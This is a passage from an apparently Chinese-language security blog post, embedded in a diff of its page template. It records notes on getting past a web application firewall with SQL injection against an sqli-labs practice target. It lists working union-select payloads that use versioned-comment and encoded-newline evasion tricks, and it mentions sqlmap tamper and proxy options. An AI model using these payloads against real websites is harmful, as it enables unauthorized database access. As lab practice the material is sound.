http://10.16.42.229/sqli-labs-master/Less-2/temp.txt?id=-1 union select 1,2,3# 成功绕过</span><br><span class="line">	Apache只识别到前面的.php/.aspx，后面的不识别</span><br><span class="line">爬虫白名单：</span><br><span class="line">URL白名单：</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/?id=-1%20union%20/*!44509select*/%201,2,3-- </span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/?id=-1%20union%20all%23%0a%20select%201,2,3#</span><br><span class="line"></span><br><span class="line">sqlmap可设置绕过脚本，代理等：--temper  --proxy</span><br><span class="line">sqlmap功能尤其强大，需要好好利用，当之无愧的注入神器</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
